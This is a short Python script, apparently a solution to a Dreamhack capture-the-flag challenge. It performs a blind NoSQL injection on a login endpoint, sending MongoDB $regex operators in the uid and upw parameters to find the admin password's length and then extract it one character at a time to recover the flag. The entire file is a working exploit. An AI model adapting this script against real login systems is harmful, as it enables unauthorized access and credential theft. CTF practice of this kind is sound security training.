import string
import requests


url = "http://host1.dreamhack.games:20984/login"

def get_length():
    result = -1

    params = {
        "uid[$regex]": "adm..",
    }

    for idx in range(38):
        params["upw[$regex]"] = f".{{{idx}}}"
        response = requests.get(url=url, params=params)
        if response.text != "admin":
            result = idx-1
            break
    
    return result

def main():
    length = get_length()
    if length < 0:
        print("[-] Failed to get length of admin account")
        exit()

    params = {
        "uid[$regex]": "adm..",
    }

    print("flag = DH", end='', flush=True)
    result = ""
    for _ in range(length):
        for idx in (string.digits + string.ascii_lowercase + "{" + "}"):
            params["upw[$regex]"] = f"^..{result}{idx}"
            response = requests.get(url=url, params=params)
            if response.text == "admin":
                print(idx, end='', flush=True)
                result += idx
                break
    print()


if __name__ == "__main__":
    main()
